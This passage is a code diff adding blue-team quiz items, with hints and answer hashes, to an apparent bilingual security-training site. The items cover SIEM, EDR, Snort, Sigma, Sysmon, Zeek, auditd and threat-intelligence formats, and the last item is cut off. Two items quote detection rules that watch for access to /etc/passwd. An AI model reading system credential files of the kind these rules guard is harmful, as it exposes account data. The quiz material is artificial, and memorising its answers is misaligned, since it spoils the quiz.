@@ -116,6 +116,14 @@ const TRACKS = [
     "en": "Hardware & IoT",
     "desc_ko": "직렬 버스·펌웨어·무선 프로토콜과 산업 제어 시스템.",
     "desc_en": "Serial buses, firmware, wireless protocols and industrial control systems."
+  },
+  {
+    "id": "blueteam",
+    "icon": "🛡️",
+    "ko": "블루팀 탐지·대응",
+    "en": "Blue Team & Detection",
+    "desc_ko": "로그 수집·탐지 룰·사고 대응과 위협 인텔리전스.",
+    "desc_en": "Log collection, detection rules, incident response and threat intelligence."
   }];
 
 const CHALLENGES = [
@@ -8936,6 +8944,986 @@ const CHALLENGES = [
       "en": [
         "The adjective for 'safe' and the noun for starting a machine up, as two separate words.",
         "On a device shipped with the fuses unburned the root of the chain is empty, and an image signed with your own key passes as genuine."
+      ]
+    }
+  },
+  {
+    "id": "t0_siem",
+    "tier": 0,
+    "cat": "detection",
+    "track": "blueteam",
+    "points": 45,
+    "ci": true,
+    "hash": "5eabe06ffe1942a31cfba4b1f763e76775a81d957369e9e5a43752c5b89fc996",
+    "fmt": "약어 / acronym (4글자 / 4 chars)",
+    "title": {
+      "ko": "흩어진 기록을 한자리에",
+      "en": "Every Record in One Place"
+    },
+    "prompt": {
+      "ko": "방화벽·서버·단말이 저마다 따로 남기는 기록을 한곳으로 끌어모아 형식을 맞추고, \"10분 안에 실패한 로그인 50번\" 같은 규칙으로 장비를 가로질러 사건을 엮어 경보를 올리는 관제의 중심 시스템이 있습니다. 네 글자 약어로 무엇이라 부를까요?",
+      "en": "Firewalls, servers and endpoints each keep their own records. Which system pulls all of them into one place, puts them in a common shape, and raises an alarm when a rule like \"fifty failed logins in ten minutes\" matches across devices? Give the four-letter abbreviation."
+    },
+    "hints": {
+      "ko": [
+        "Security Information and Event Management 의 머리글자입니다.",
+        "저장과 검색만 해 주는 기록 서버와 달리, 서로 다른 장비의 기록을 규칙으로 엮어 본다는 점이 핵심입니다."
+      ],
+      "en": [
+        "The initials of Security Information and Event Management.",
+        "Unlike a server that only stores and searches, the point here is tying records from different devices together with rules."
+      ]
+    }
+  },
+  {
+    "id": "t0_soc",
+    "tier": 0,
+    "cat": "detection",
+    "track": "blueteam",
+    "points": 50,
+    "ci": true,
+    "hash": "7114d75b28f21587e37f4a299da0a9428684a8b72773b3087e8d6e63cfb4f312",
+    "fmt": "약어 / acronym (3글자 / 3 chars)",
+    "title": {
+      "ko": "불이 꺼지지 않는 방",
+      "en": "The Room That Never Goes Dark"
+    },
+    "prompt": {
+      "ko": "경보를 24시간 사람이 지켜보고 대응하는 조직, 그리고 그 사람들이 앉아 있는 관제실을 함께 가리키는 세 글자 약어는? 보통 1선이 첫 판단을, 2선이 깊은 분석을, 3선이 위협 사냥과 규칙 개선을 맡는 계층 구조로 운영됩니다.",
+      "en": "Which three-letter abbreviation names both the team that watches alarms around the clock and the room they sit in? It is usually layered: tier 1 makes the first call, tier 2 digs deeper, and tier 3 hunts and improves the rules."
+    },
+    "hints": {
+      "ko": [
+        "Security Operations Center 의 머리글자입니다.",
+        "조직이자 장소를 함께 부르는 말이라, \"우리 회사는 이것을 외부에 맡긴다\"처럼도 씁니다."
+      ],
+      "en": [
+        "The initials of Security Operations Center.",
+        "It names a team and a place at once, which is why companies say they \"outsource\" theirs."
+      ]
+    }
+  },
+  {
+    "id": "t1_edr",
+    "tier": 1,
+    "cat": "detection",
+    "track": "blueteam",
+    "points": 60,
+    "ci": true,
+    "hash": "102e69f032cc2d62bb9db9160b549000dc2da76536fed635703d8d82d782e558",
+    "fmt": "약어 / acronym (3글자 / 3 chars)",
+    "title": {
+      "ko": "단말 위에 남는 눈",
+      "en": "The Eye Left on the Endpoint"
+    },
+    "prompt": {
+      "ko": "백신이 파일을 훑어 알려진 악성코드를 지우는 데서 멈춘다면, 이 종류의 제품은 단말에 상주하며 프로세스 생성·레지스트리 변경·네트워크 연결을 계속 기록해 두었다가, 나중에 \"이 프로세스의 부모가 무엇이었나\"를 거슬러 올라가 보게 해 주고 원격으로 프로세스를 죽이거나 단말을 망에서 떼어 놓기까지 합니다. 세 글자 약어는?",
+      "en": "Antivirus scans files and removes what it already knows. This class of product instead lives on the machine and keeps recording process launches, registry writes and network connections, so that later you can walk back up and ask which process was the parent of which — and it can kill processes or cut the machine off the network remotely. Which three-letter abbreviation names it?"
+    },
+    "hints": {
+      "ko": [
+        "Endpoint Detection and Response 의 머리글자입니다.",
+        "\"지웠다\"로 끝나지 않고 \"무엇이 무엇을 낳았는지\"를 나중에 되짚을 수 있다는 점이 이전 세대 제품과의 차이입니다."
+      ],
+      "en": [
+        "The initials of Endpoint Detection and Response.",
+        "The break from the older generation is that it does not stop at \"removed\" — you can reconstruct what spawned what, afterwards."
+      ]
+    }
+  },
+  {
+    "id": "t1_syslog",
+    "tier": 1,
+    "cat": "detection",
+    "track": "blueteam",
+    "points": 60,
+    "ci": true,
+    "hash": "4d75f832ea2693e75fef081110af0c23a91d4d166a1ce1f63aa3d3d69cef9882",
+    "fmt": "한 단어 / one word",
+    "title": {
+      "ko": "514번으로 흘러가는 줄",
+      "en": "Lines Flowing to 514"
+    },
+    "prompt": {
+      "ko": "유닉스 계열이 오래 써 온 기록 전달 규약입니다. 각 줄 앞에 설비(facility)와 심각도를 하나의 숫자로 눌러 담은 우선순위 값이 붙고, 기본적으로 UDP 514번 포트로 원격 수집 서버에 그대로 흘려보냅니다. RFC 5424 가 형식을 다시 정리했습니다. 이 규약의 이름은?",
+      "en": "The long-standing Unix-family protocol for shipping records. Each line carries a priority value that packs a facility and a severity into one number, and by default the lines are pushed to a remote collector over UDP port 514. RFC 5424 restated its format. What is it called?"
+    },
+    "hints": {
+      "ko": [
+        "이름 자체가 \"시스템\"과 \"기록\"을 붙여 만든 합성어입니다.",
+        "우선순위 값은 설비 번호에 8을 곱하고 심각도를 더해 만듭니다 — 그래서 한 숫자만 보고도 둘 다 복원할 수 있습니다."
+      ],
+      "en": [
+        "The name itself is \"system\" and \"log\" fused together.",
+        "The priority value is the facility times eight plus the severity, which is why one number recovers both."
+      ]
+    }
+  },
+  {
+    "id": "t1_splunk",
+    "tier": 1,
+    "cat": "detection",
+    "track": "blueteam",
+    "points": 65,
+    "ci": true,
+    "hash": "101e21bef69a3df68f36ca31deb6616f10cc70e4bae8eed9ce83a9effb1fd5cb",
+    "fmt": "도구 이름 / tool name",
+    "title": {
+      "ko": "파이프로 이어 붙이는 검색",
+      "en": "Search Stitched with Pipes"
+    },
+    "prompt": {
+      "ko": "기계가 쏟아내는 기록을 색인해 두고, 셸처럼 파이프(`|`)로 명령을 이어 붙이는 자체 검색 언어(SPL)로 뒤지는 상용 플랫폼입니다. 인덱싱한 하루 용량으로 값을 매기는 것으로도 유명합니다. 제품 이름은?",
+      "en": "A commercial platform that indexes machine-generated records and queries them in its own search language (SPL), where you chain commands with a pipe (`|`) the way a shell does. It is equally famous for pricing by how many gigabytes a day you index. What is the product called?"
+    },
+    "hints": {
+      "ko": [
+        "검색 언어의 약어가 SPL 인 데서 이름을 짐작할 수 있습니다.",
+        "동굴 탐험(spelunking)에서 따온 이름이라는 설명이 널리 알려져 있습니다."
+      ],
+      "en": [
+        "The search language is abbreviated SPL, which points at the name.",
+        "The name is widely explained as coming from spelunking — crawling through caves."
+      ]
+    }
+  },
+  {
+    "id": "t1_triage",
+    "tier": 1,
+    "cat": "ir",
+    "track": "blueteam",
+    "points": 65,
+    "ci": true,
+    "hash": "0f916789d300a986c41cdb23c248926aaec1f73a9bbae0a7efae074f16480baf",
+    "fmt": "한 단어 / one word",
+    "title": {
+      "ko": "전장에서 온 말",
+      "en": "A Word from the Battlefield"
+    },
+    "prompt": {
+      "ko": "경보가 하루에 수천 건 쏟아지면 전부 깊이 파 볼 수는 없습니다. 그래서 1선은 각 경보를 짧게 훑어 \"즉시 대응\", \"지켜보기\", \"오탐으로 닫기\"로 갈라 놓습니다. 부상자를 치료 우선순위로 나누던 전장 의료에서 그대로 가져온 이 단계를 뭐라고 부를까요?",
+      "en": "When thousands of alarms arrive in a day, there is no way to examine every one of them in depth. So the first tier gives each one a short look and sorts it into act now, keep watching, or close as a false alarm. Battlefield medicine sorted the wounded by treatment priority the same way and lent this step its name. What is it?"
+    },
+    "hints": {
+      "ko": [
+        "프랑스어에서 온 말로, 원래 뜻은 \"골라내기\"입니다.",
+        "나폴레옹 전쟁기의 야전 의무에서 유래했다고 알려져 있습니다."
+      ],
+      "en": [
+        "It comes from French, where it plainly means \"sorting\".",
+        "It is usually traced to field medicine in the Napoleonic wars."
+      ]
+    }
+  },
+  {
+    "id": "t1_playbook",
+    "tier": 1,
+    "cat": "ir",
+    "track": "blueteam",
+    "points": 70,
+    "ci": true,
+    "hash": "2f2cc2a2b7df8544cefb9b1816b341156fe25406b873d5f7ea3db6a02c2bf8bb",
+    "fmt": "한 단어 / one word",
+    "title": {
+      "ko": "새벽 세 시에 펼치는 것",
+      "en": "What You Open at Three in the Morning"
+    },
+    "prompt": {
+      "ko": "\"랜섬웨어 의심 시: ① 해당 단말을 망에서 분리 ② 메모리와 디스크 확보 ③ 법무·홍보에 통보 ④ 백업 무결성 확인\" 처럼, 특정 사건 유형에 대해 누가 무엇을 어떤 순서로 하는지 미리 적어 둔 문서를 뭐라고 부를까요? 미식축구에서 작전을 그려 두는 책자에서 온 말입니다.",
+      "en": "\"On suspected ransomware: (1) pull the machine off the network, (2) capture memory and disk, (3) notify legal and comms, (4) check that backups are intact.\" What do you call a document that spells out, in advance, who does what in which order for one type of incident? The word comes from the book of plays a football team drills from."
+    },
+    "hints": {
+      "ko": [
+        "운동 경기에서 미리 짜 둔 작전을 모아 놓은 책을 가리키는 말입니다.",
+        "자동화 도구가 이것을 그대로 실행하도록 만들어 두기도 합니다 — 사람이 읽는 절차서와 기계가 읽는 절차가 같은 이름을 씁니다."
+      ],
+      "en": [
+        "In sport it is the book of set plays a team rehearses.",
+        "Automation tools are often built to execute one directly, so the human procedure and the machine procedure share the name."
+      ]
+    }
+  },
+  {
+    "id": "t1_snort",
+    "tier": 1,
+    "cat": "detection",
+    "track": "blueteam",
+    "points": 70,
+    "ci": true,
+    "hash": "d774e032616fb5d8b7d8ca50dbbcc39c83c490085fcdf707cc91aa86dcc0e8bd",
+    "fmt": "도구 이름 / tool name",
+    "title": {
+      "ko": "돼지가 지키는 관문",
+      "en": "The Pig at the Gate"
+    },
+    "prompt": {
+      "ko": "1998년에 나와 오랫동안 사실상 표준이었던 오픈소스 네트워크 침입 탐지 도구입니다. `alert tcp any any -> $HOME_NET 80 (content:\"/etc/passwd\"; sid:1000001;)` 같은 한 줄짜리 규칙 문법으로 유명하고, 마스코트는 돼지입니다. 이름은?",
+      "en": "The open-source network intrusion detection tool that appeared in 1998 and was the de facto standard for years. It is known for one-line rules such as `alert tcp any any -> $HOME_NET 80 (content:\"/etc/passwd\"; sid:1000001;)`, and its mascot is a pig. What is it called?"
+    },
+    "hints": {
+      "ko": [
+        "돼지가 코로 내는 소리를 뜻하는 영어 단어입니다.",
+        "같은 규칙 문법을 이어받아 멀티스레드로 다시 쓴 후발 주자가 따로 있습니다."
+      ],
+      "en": [
+        "It is the English word for the noise a pig makes through its nose.",
+        "A later project inherited the same rule syntax and rewrote the engine to be multi-threaded."
+      ]
+    }
+  },
+  {
+    "id": "t2_sigma",
+    "tier": 2,
+    "cat": "detection",
+    "track": "blueteam",
+    "points": 80,
+    "ci": true,
+    "hash": "38de90475bb334fb3dea5d54f250500aba60fe2c6158115d342b06bcb46e39bf",
+    "fmt": "한 단어 / one word",
+    "title": {
+      "ko": "어느 플랫폼에나 붙는 규칙",
+      "en": "A Rule That Fits Any Platform"
+    },
+    "prompt": {
+      "ko": "탐지 규칙을 특정 제품의 질의 문법이 아니라 YAML 로 적어 두는 공개 형식입니다. `logsource:` 로 어떤 기록인지 밝히고, `detection:` 아래에 찾을 항목을 나열한 뒤 `condition:` 으로 그것들을 조합합니다. 그렇게 한 번 적어 두면 변환기가 각 관제 플랫폼의 질의문으로 바꿔 주기 때문에, 규칙을 제품에 묶이지 않게 나눌 수 있습니다. 이 형식의 이름은?",
+      "en": "A public format for writing detection rules in YAML instead of one product query dialect. `logsource:` states which records it applies to, the items to look for are listed under `detection:`, and `condition:` combines them. Written once, a converter turns it into the query language of each monitoring platform, so rules can be shared without being tied to a vendor. What is the format called?"
+    },
+    "hints": {
+      "ko": [
+        "그리스 문자에서 이름을 따왔습니다 — 수학에서 합을 나타낼 때 쓰는 그 대문자입니다.",
+        "네트워크 규칙과 파일 패턴에는 이미 공용 형식이 있었지만 기록 쪽에는 없었고, 그 빈자리를 메우려고 만들어졌습니다."
+      ],
+      "en": [
+        "It is named after a Greek letter — the capital one mathematics uses for a sum.",
+        "Network rules and file patterns already had shared formats; records did not, and this was written to fill that hole."
+      ]
+    }
+  },
+  {
+    "id": "t2_sysmon",
+    "tier": 2,
+    "cat": "detection",
+    "track": "blueteam",
+    "points": 85,
+    "ci": true,
+    "hash": "bfadbf0d062a931111578f8c18867067a39ea1664998d680db92903e8fe28a52",
+    "fmt": "도구 이름 / tool name",
+    "title": {
+      "ko": "윈도우가 기본으로는 안 남기는 것",
+      "en": "What Windows Will Not Record on Its Own"
+    },
+    "prompt": {
+      "ko": "Sysinternals 가 내놓은 무료 도구로, 드라이버와 서비스로 설치되어 윈도우 기본 감사보다 훨씬 촘촘한 기록을 전용 채널에 남깁니다. 이벤트 1번은 프로세스 생성(명령줄과 부모까지), 3번은 네트워크 연결, 11번은 파일 생성, 22번은 DNS 질의입니다. 무엇을 남길지는 XML 설정으로 좁혀야 하고, 그러지 않으면 금세 잡음에 파묻힙니다. 이 도구의 이름은?",
+      "en": "A free Sysinternals tool that installs as a driver and a service and writes far denser records than the built-in Windows auditing, into a channel of its own. Event 1 is process creation, with command line and parent; 3 is a network connection; 11 is a file being written; 22 is a DNS query. What it records has to be narrowed with an XML configuration, or the volume buries you. What is the tool called?"
+    },
+    "hints": {
+      "ko": [
+        "\"시스템\"과 \"감시\"를 줄여 붙인 이름입니다.",
+        "공개된 설정 파일들이 널리 쓰이는데, 무엇을 남기느냐보다 무엇을 빼느냐가 설정의 대부분입니다."
+      ],
+      "en": [
+        "The name is \"system\" and \"monitor\", both cut short.",
+        "Community configurations are widely reused, and most of their content is exclusions rather than inclusions."
+      ]
+    }
+  },
+  {
+    "id": "t2_suricata",
+    "tier": 2,
+    "cat": "detection",
+    "track": "blueteam",
+    "points": 85,
+    "ci": true,
+    "hash": "c2f3826a1cb8c3c29eba0d1fd23d55898da013f1057fc9e4116e83fbc790ef89",
+    "fmt": "도구 이름 / tool name",
+    "title": {
+      "ko": "여러 코어로 흩어 보는 눈",
+      "en": "Eyes Spread Across Cores"
+    },
+    "prompt": {
+      "ko": "2009년에 나온 오픈소스 침입 탐지·차단 엔진입니다. 앞 세대의 한 줄짜리 규칙 문법을 그대로 받아들이면서 처음부터 여러 스레드로 돌도록 다시 썼고, 포트가 아니라 실제 오간 내용을 보고 프로토콜을 판별하며, 흐르는 트래픽에서 파일을 통째로 떼어내 해시까지 남깁니다. 결과는 EVE 라는 JSON 형식으로 쏟아집니다. 마스코트는 미어캣입니다. 이름은?",
+      "en": "An open-source intrusion detection and prevention engine from 2009. It accepts the previous generation one-line rule syntax while being rewritten from the start to run across threads, identifies protocols from what actually passes rather than from the port, and carves whole files out of live traffic, hashing them as it goes. Its output pours into a JSON format called EVE. Its mascot is a meerkat. What is it called?"
+    },
+    "hints": {
+      "ko": [
+        "마스코트인 미어캣의 학명이 그대로 이름입니다.",
+        "OISF 라는 재단이 관리합니다."
+      ],
+      "en": [
+        "The scientific name of the meerkat on its logo is the name.",
+        "It is maintained by a foundation called OISF."
+      ]
+    }
+  },
+  {
+    "id": "t2_zeek",
+    "tier": 2,
+    "cat": "detection",
+    "track": "blueteam",
+    "points": 90,
+    "ci": true,
+    "hash": "6e349f5b2a04d4f0c538ea1e8dd8a95067fd2c32f150a152816f14dcfdae0364",
+    "fmt": "도구 이름 / tool name",
+    "title": {
+      "ko": "경보 대신 기록을 남기는 감시자",
+      "en": "A Watcher That Files Records, Not Alarms"
+    },
+    "prompt": {
+      "ko": "네트워크를 지켜보되 \"공격이다\"라고 소리치는 대신, 오간 것을 종류별 기록으로 정리해 놓는 도구입니다. `conn.log`·`dns.log`·`http.log`·`ssl.log` 처럼 프로토콜마다 파일이 생기고, 자체 스크립트 언어로 원하는 판단을 얹을 수 있습니다. 1990년대 로렌스 버클리 연구소에서 시작해 2018년에 이름을 바꿨는데, 그전 이름은 형제를 뜻하는 세 글자 단어였습니다. 지금 이름은?",
+      "en": "A tool that watches a network but, instead of shouting that something is an attack, files what passed as records sorted by kind: `conn.log`, `dns.log`, `http.log`, `ssl.log`, one per protocol, with its own scripting language for layering judgements on top. It began at Lawrence Berkeley in the 1990s and was renamed in 2018; the old name was a three-letter word for a brother. What is it called now?"
+    },
+    "hints": {
+      "ko": [
+        "네 글자이고, 옛 이름이 조지 오웰의 『1984』에서 온 데 비해 새 이름은 특별한 뜻이 없는 짧은 말입니다.",
+        "경보를 주는 물건이 아니라, 나중에 질문을 던질 수 있도록 사실을 쌓아 두는 물건입니다."
+      ],
+      "en": [
+        "Four letters; where the old name came from Orwell, the new one is a short word with no particular meaning.",
+        "It is not an alarm — it is a pile of facts you can ask questions of afterwards."
+      ]
+    }
+  },
+  {
+    "id": "t2_auditd",
+    "tier": 2,
+    "cat": "detection",
+    "track": "blueteam",
+    "points": 90,
+    "ci": true,
+    "hash": "73780c7df3bcc07d77d28b76dbdb9ac698cbd2d1671aff6548a3983fcf40b5a2",
+    "fmt": "서비스 이름 / service name",
+    "title": {
+      "ko": "커널이 부르면 받아 적는 데몬",
+      "en": "The Daemon the Kernel Dictates To"
+    },
+    "prompt": {
+      "ko": "리눅스 커널의 감사 하위 시스템이 내보내는 사건을 받아 `/var/log/audit/` 아래에 쌓는 사용자 공간 데몬입니다. `-a always,exit -F arch=b64 -S execve -k exec` 같은 규칙을 걸면 실행된 모든 프로그램을 잡을 수 있고, `-w /etc/passwd -p wa` 처럼 파일에 감시를 걸 수도 있습니다. 쌓인 것은 `ausearch` 와 `aureport` 로 뒤집니다. 이 데몬의 이름은?",
+      "en": "The user-space daemon that receives events emitted by the Linux kernel audit subsystem and files them under `/var/log/audit/`. A rule such as `-a always,exit -F arch=b64 -S execve -k exec` catches every program that runs, and `-w /etc/passwd -p wa` puts a watch on a file. What piles up is searched with `ausearch` and `aureport`. What is the daemon called?"
+    },
+    "hints": {
+      "ko": [
+        "이름은 \"감사\"라는 영어 낱말에 데몬을 뜻하는 글자 하나를 붙인 여섯 글자입니다.",
+        "규칙은 `auditctl` 로 즉시 걸고, 재부팅 뒤에도 남기려면 규칙 파일에 적어 둡니다."
+      ],
+      "en": [
+        "Six letters: the English word for an audit plus the single letter that marks a daemon.",
+        "Rules go in live with `auditctl`; to survive a reboot they belong in the rules file."
+      ]
+    }
+  },
+  {
+    "id": "t2_elk",
+    "tier": 2,
+    "cat": "detection",
+    "track": "blueteam",
+    "points": 90,
+    "ci": true,
+    "hash": "2f60f61a34244180b562a206de450c7419e3b3cfa274c7903ba888f3bc0ebc11",
+    "fmt": "약어 / acronym (3글자 / 3 chars)",
+    "title": {
+      "ko": "세 제품의 머리글자",
+      "en": "Three Products, Three Letters"
+    },
+    "prompt": {
+      "ko": "기록을 다루는 오픈소스 조합을 부르던 세 글자 이름입니다. 색인과 검색을 맡는 저장소, 들어오는 줄을 잘라 필드로 만드는 수집·가공기, 그리고 그것을 그래프와 대시보드로 보여 주는 화면 — 이 세 제품의 머리글자를 그대로 붙였습니다. 나중에 가벼운 전송기 묶음이 합류하면서 회사는 이 이름 대신 \"Elastic Stack\" 을 밀었지만 현장에서는 여전히 이 세 글자로 부릅니다. 무엇일까요?",
+      "en": "The three-letter name for the open-source combination people used to work with records: the store that indexes and searches, the collector that cuts incoming lines into fields, and the screen that turns them into graphs and dashboards — the initials of those three products, in order. After a family of lightweight shippers joined, the company pushed \"Elastic Stack\" instead, but the field still says these three letters. What are they?"
+    },
+    "hints": {
+      "ko": [
+        "공교롭게도 큰 사슴을 뜻하는 영어 낱말과 철자가 같습니다.",
+        "가운데 글자가 가공기, 마지막 글자가 화면입니다."
+      ],
+      "en": [
+        "The three letters happen to spell the English word for a large deer.",
+        "The middle letter is the collector; the last one is the screen."
+      ]
+    }
+  },
+  {
+    "id": "t2_quarantine",
+    "tier": 2,
+    "cat": "ir",
+    "track": "blueteam",
+    "points": 100,
+    "ci": true,
+    "hash": "c2d66755e6d0b42f7a54187c020f4c80f779620a057c070c779007da6b851f5d",
+    "fmt": "한 단어 / one word",
+    "title": {
+      "ko": "지우지 않고 가두기",
+      "en": "Not Deleted, Held"
+    },
+    "prompt": {
+      "ko": "악성으로 판정된 파일을 백신이 곧바로 지워 버리면 오탐일 때 되돌릴 수 없고 분석할 검체도 사라집니다. 그래서 대개는 원래 자리에서 들어내 실행되지 않도록 부호를 뒤집거나 암호화해 전용 보관소에 옮겨 두고, 필요하면 원상복구하거나 꺼내어 분석합니다. 이 조치를 뭐라고 부를까요? 이름은 항구에서 배를 40일 붙잡아 두던 관행에서 왔습니다.",
+      "en": "If antivirus simply deletes a file it judged malicious, a false alarm cannot be undone and the specimen to analyse is gone. So the usual move is to lift it out of its place, encode or encrypt it so it cannot run, and hold it in a store of its own, from which it can be restored or fetched for analysis. What is that called? The name comes from holding ships at port for forty days."
+    },
+    "hints": {
+      "ko": [
+        "이탈리아어로 40 을 뜻하는 말에서 왔습니다.",
+        "흑사병 시절 베네치아의 항구 관행이 어원입니다."
+      ],
+      "en": [
+        "It comes from the Italian word for forty.",
+        "The origin is a Venetian harbour practice from the time of the plague."
+      ]
+    }
+  },
+  {
+    "id": "t2_osint",
+    "tier": 2,
+    "cat": "intel",
+    "track": "blueteam",
+    "points": 100,
+    "ci": true,
+    "hash": "607b00503c7e5203980e2f657b7493e52faaf49c99c42ec541f3b36ee1bd67da",
+    "fmt": "약어 / acronym (5글자 / 5 chars)",
+    "title": {
+      "ko": "아무도 훔치지 않은 정보",
+      "en": "Intelligence Nobody Stole"
+    },
+    "prompt": {
+      "ko": "등기부·채용공고·인증서 투명성 로그·깃허브 커밋 기록·직원의 사회관계망 게시물처럼, 누구나 합법적으로 볼 수 있는 자료만 모아 엮어 만드는 정보를 다섯 글자 약어로 뭐라고 부를까요? 침투를 준비하는 쪽도, 자기 조직이 밖에서 어떻게 보이는지 점검하는 쪽도 같은 것을 씁니다.",
+      "en": "Registries, job postings, certificate transparency logs, commit histories, what staff post on social networks — intelligence built only from material anyone may lawfully look at. Which five-letter abbreviation names it? The side preparing an intrusion and the side checking how its own organisation looks from outside both work from it."
+    },
+    "hints": {
+      "ko": [
+        "Open Source 로 시작하는 네 낱말의 머리글자입니다 — 여기서 \"오픈 소스\"는 소프트웨어 라이선스와는 상관없는 말입니다.",
+        "자료를 모으는 행위 자체는 표적에게 아무 흔적도 남기지 않는 경우가 많습니다."
+      ],
+      "en": [
+        "The initials of four words beginning with Open Source — where \"open source\" has nothing to do with software licensing.",
+        "Gathering it often leaves no trace at all on the target."
+      ]
+    }
+  },
+  {
+    "id": "t3_stix",
+    "tier": 3,
+    "cat": "intel",
+    "track": "blueteam",
+    "points": 105,
+    "ci": true,
+    "hash": "78eaa0fed572067109de696c405b5eb4e3882914d4d4e57e8df7133c98910f32",
+    "fmt": "약어 / acronym (4글자 / 4 chars)",
+    "title": {
+      "ko": "위협을 문법에 담다",
+      "en": "Threats With a Grammar"
+    },
+    "prompt": {
+      "ko": "\"저 주소는 나쁘다\"를 사람이 읽는 보고서 대신 기계가 읽는 객체로 적는 공개 표현 형식입니다. `indicator`·`malware`·`threat-actor`·`campaign` 같은 객체를 JSON 으로 쓰고, 그 사이를 `uses`·`attributed-to` 같은 관계 객체로 이어 그래프를 만듭니다. 네 글자 약어로 무엇일까요?",
+      "en": "A public representation format that writes \"that address is bad\" as machine-readable objects instead of a report a human reads. Objects such as `indicator`, `malware`, `threat-actor` and `campaign` are written in JSON, and relationship objects such as `uses` and `attributed-to` join them into a graph. Which four-letter abbreviation names it?"
+    },
+    "hints": {
+      "ko": [
+        "Structured Threat Information eXpression 의 머리글자입니다.",
+        "무엇을 담을지를 정하는 표현 형식일 뿐이고, 그것을 실어 나르는 통신 규약은 짝을 이루는 다른 이름으로 따로 있습니다."
+      ],
+      "en": [
+        "The initials of Structured Threat Information eXpression.",
+        "It only settles what is written down; the protocol that carries it across the wire is a separate, companion name."
+      ]
+    }
+  },
+  {
+    "id": "t3_taxii",
+    "tier": 3,
+    "cat": "intel",
+    "track": "blueteam",
+    "points": 110,
+    "ci": true,
+    "hash": "9416921b0171a04c5329b657841f40cdfce07beed8f4131846fd1161a1806e3d",
+    "fmt": "약어 / acronym (5글자 / 5 chars)",
+    "title": {
+      "ko": "실어 나르는 쪽",
+      "en": "The Half That Carries It"
+    },
+    "prompt": {
+      "ko": "위협 정보를 어떤 모양으로 적을지가 정해졌다면 이제 그것을 주고받을 통로가 필요합니다. HTTPS 위에서 도는 이 규약은 서버가 `/taxii2/` 아래에 API 루트를 두고, 받는 쪽이 주기적으로 끌어가는 컬렉션과 밀어 주는 채널을 제공합니다. 다섯 글자 약어로 무엇이라 부를까요?",
+      "en": "Once the shape of threat information is settled, there still has to be a way to move it. This protocol runs over HTTPS: a server exposes API roots under `/taxii2/`, offering collections that consumers poll and channels that push to them. Which five-letter abbreviation names it?"
+    },
+    "hints": {
+      "ko": [
+        "Trusted Automated eXchange of Intelligence Information 의 머리글자입니다.",
+        "내용의 문법이 아니라 배달을 맡는 쪽이라, 서로 다른 진영이 같은 통로로 다른 형식을 실어 보내기도 합니다."
+      ],
+      "en": [
+        "The initials of Trusted Automated eXchange of Intelligence Information.",
+        "It handles delivery rather than the grammar of the content, so different camps sometimes ship different formats down the same pipe."
+      ]
+    }
+  },
+  {
+    "id": "t3_misp",
+    "tier": 3,
+    "cat": "intel",
+    "track": "blueteam",
+    "points": 110,
+    "ci": true,
+    "hash": "a22d818435177efd8bcb8b3b00514ba5814aa0c44599df4faa549cac3f8e2a11",
+    "fmt": "약어 / acronym (4글자 / 4 chars)",
+    "title": {
+      "ko": "같이 보는 사건 장부",
+      "en": "A Ledger Everyone Reads"
+    },
+    "prompt": {
+      "ko": "여러 조직이 각자 관찰한 것을 올려놓고 나눠 보는 오픈소스 공유 플랫폼입니다. 하나의 침해를 `event` 로 세우고 그 아래에 주소·해시·도메인을 `attribute` 로 달며, 어디까지 퍼뜨릴지는 초록·주황·빨강으로 표시하는 신호등 규약으로 정합니다. 다른 조직의 서버를 그대로 동기화해 끌어올 수도 있습니다. 네 글자 약어로 무엇일까요?",
+      "en": "An open-source sharing platform where several organisations post what each of them observed. One intrusion becomes an `event`, with addresses, hashes and domains hung under it as `attribute` records, and how far it may travel is set with the green/amber/red traffic-light convention. A server can also synchronise wholesale from another organisation's. Which four-letter abbreviation names it?"
+    },
+    "hints": {
+      "ko": [
+        "Malware Information Sharing Platform 의 머리글자입니다 — 이름이 붙던 시절보다 지금은 훨씬 넓은 것을 담습니다.",
+        "신호등 표시를 잘못 달면 원래 조직 안에서만 돌아야 할 것이 연합 전체로 퍼집니다."
+      ],
+      "en": [
+        "The initials of Malware Information Sharing Platform — it now holds far more than the name from its early days suggests.",
+        "Mislabel the traffic light and something meant to stay inside one organisation travels to the whole federation."
+      ]
+    }
+  },
+  {
+    "id": "t3_cti",
+    "tier": 3,
+    "cat": "intel",
+    "track": "blueteam",
+    "points": 115,
+    "ci": true,
+    "hash": "4893825586217838d936b0d6c498f8427fe26f8aaad834ab6a042909b39d2098",
+    "fmt": "약어 / acronym (3글자 / 3 chars)",
+    "title": {
+      "ko": "자료가 아니라 판단",
+      "en": "Not Data, a Judgement"
+    },
+    "prompt": {
+      "ko": "수집한 자료 더미가 아니라, 그것을 특정 조직의 처지에 비추어 분석해 \"우리가 무엇을 해야 하는가\"까지 답해 주는 결과물을 가리키는 분야의 세 글자 약어는? 경영진을 향한 전략 수준, 공격 집단의 행동 방식을 다루는 작전 수준, 곧바로 탐지에 넣을 수 있는 전술 수준으로 나누어 이야기합니다.",
+      "en": "Not a pile of collected data, but the product of analysing it against one organisation's situation until it answers \"what should we do\". Which three-letter abbreviation names that discipline? It is usually split into a strategic level aimed at executives, an operational level about how an adversary behaves, and a tactical level that can be fed straight into detection."
+    },
+    "hints": {
+      "ko": [
+        "Cyber Threat Intelligence 의 머리글자입니다.",
+        "받는 사람이 그것을 읽고 무언가를 바꾸지 않는다면, 아무리 정확해도 이 이름을 붙일 수 없다고들 말합니다."
+      ],
+      "en": [
+        "The initials of Cyber Threat Intelligence.",
+        "The saying is that if the recipient changes nothing after reading it, however accurate it was, it does not earn this name."
+      ]
+    }
+  },
+  {
+    "id": "t3_ttp",
+    "tier": 3,
+    "cat": "intel",
+    "track": "blueteam",
+    "points": 120,
+    "ci": true,
+    "hash": "9e0a25b467849e5c166fa6be70197cc6fb83937f8970bc45cb153460f72c00c5",
+    "fmt": "약어 / acronym (3글자 / 3 chars)",
+    "title": {
+      "ko": "바꾸기 가장 힘든 것",
+      "en": "The Hardest Thing to Change"
+    },
+    "prompt": {
+      "ko": "주소 하나는 오늘 바꾸면 그만이고 파일 하나는 한 바이트만 고쳐도 해시가 달라지지만, 공격자가 몸에 익힌 일하는 방식은 그렇게 쉽게 갈아치우지 못합니다. 무엇을 노리는가·어떤 수법으로 하는가·손에 익은 순서가 어떠한가를 묶어 부르는 세 글자 약어는? MITRE ATT&CK 은 바로 이 층위를 격자에 정리한 것입니다.",
